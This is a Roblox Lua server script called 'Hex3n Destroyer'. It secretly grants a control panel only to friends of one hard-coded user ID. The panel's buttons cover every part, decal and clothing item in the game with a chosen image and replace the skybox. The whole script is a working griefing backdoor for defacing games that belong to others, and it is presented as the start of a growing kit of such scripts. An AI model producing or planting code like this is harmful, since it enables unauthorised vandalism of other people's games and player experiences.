local allowed = 8013817688

game.Players.PlayerAdded:Connect(function(player)
    local success, isFriend = pcall(function()
        return game:GetService("Players"):GetFriendshipStatusAsync(player.UserId, allowed) == Enum.FriendStatus.Friend
    end)
    if not success or not isFriend then return end

    local gui = Instance.new("ScreenGui")
    gui.Name = "Hex3nUI"
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.Parent = player:WaitForChild("PlayerGui")

    local frame = Instance.new("Frame", gui)
    frame.BackgroundColor3 = Color3.fromRGB(6, 0, 157)
    frame.Size = UDim2.new(0.38, 0, 0.21, 0)
    frame.Position = UDim2.new(0.31, 0, 0.02, 0)
    frame.BorderSizePixel = 0
    Instance.new("UICorner", frame)

    local title = Instance.new("TextLabel", frame)
    title.BackgroundColor3 = Color3.fromRGB(0, 255, 250)
    title.Size = UDim2.new(1, 0, 0.1, 0)
    title.Text = "Hex3n Destroyer"
    title.TextScaled = true
    title.BorderSizePixel = 0
    Instance.new("UICorner", title)

    local decalBtn = Instance.new("TextButton", frame)
    decalBtn.Name = "DecalBtn"
    decalBtn.Text = "Decal"
    decalBtn.Size = UDim2.new(0.2, 0, 0.3, 0)
    decalBtn.Position = UDim2.new(0.03, 0, 0.15, 0)
    decalBtn.BackgroundColor3 = Color3.fromRGB(0, 9, 255)
    decalBtn.BorderSizePixel = 0

    local skyboxBtn = Instance.new("TextButton", frame)
    skyboxBtn.Name = "SkyboxBtn"
    skyboxBtn.Text = "Skybox"
    skyboxBtn.Size = UDim2.new(0.2, 0, 0.3, 0)
    skyboxBtn.Position = UDim2.new(0.26, 0, 0.15, 0)
    skyboxBtn.BackgroundColor3 = Color3.fromRGB(0, 245, 255)
    skyboxBtn.BorderSizePixel = 0

    local infoText = Instance.new("TextLabel", frame)
    infoText.Text = "More scripts will be added in the future"
    infoText.TextWrapped = true
    infoText.BackgroundTransparency = 1
    infoText.Size = UDim2.new(0.9, 0, 0.13, 0)
    infoText.Position = UDim2.new(0.05, 0, 0.8, 0)
    infoText.TextXAlignment = Enum.TextXAlignment.Left
    infoText.BorderSizePixel = 0

    local function spamDecals()
        local decalid = "77858581719818"
        for _, v in ipairs(workspace:GetDescendants()) do
            if v:IsA("Part") or v:IsA("MeshPart") then
                for _, face in pairs(Enum.NormalId:GetEnumItems()) do
                    local decal = Instance.new("Decal")
                    decal.Texture = "rbxassetid://" .. decalid
                    decal.Face = face
                    decal.Parent = v
                end
            elseif v:IsA("Decal") then
                v.Texture = "rbxassetid://" .. decalid
            elseif v:IsA("ShirtGraphic") then
                v.Graphic = "rbxassetid://" .. decalid
            elseif v:IsA("Shirt") then
                v.ShirtTemplate = "rbxassetid://" .. decalid
            elseif v:IsA("Pants") then
                v.PantsTemplate = "rbxassetid://" .. decalid
            end
        end
    end

    local function applySkybox()
        local skyboxId = "rbxassetid://77858581719818"
        local sky = Instance.new("Sky")
        sky.SkyboxBk = skyboxId
        sky.SkyboxDn = skyboxId
        sky.SkyboxFt = skyboxId
        sky.SkyboxLf = skyboxId
        sky.SkyboxRt = skyboxId
        sky.SkyboxUp = skyboxId
        sky.Parent = game:GetService("Lighting")
    end

    decalBtn.MouseButton1Click:Connect(spamDecals)
    skyboxBtn.MouseButton1Click:Connect(applySkybox)
end)
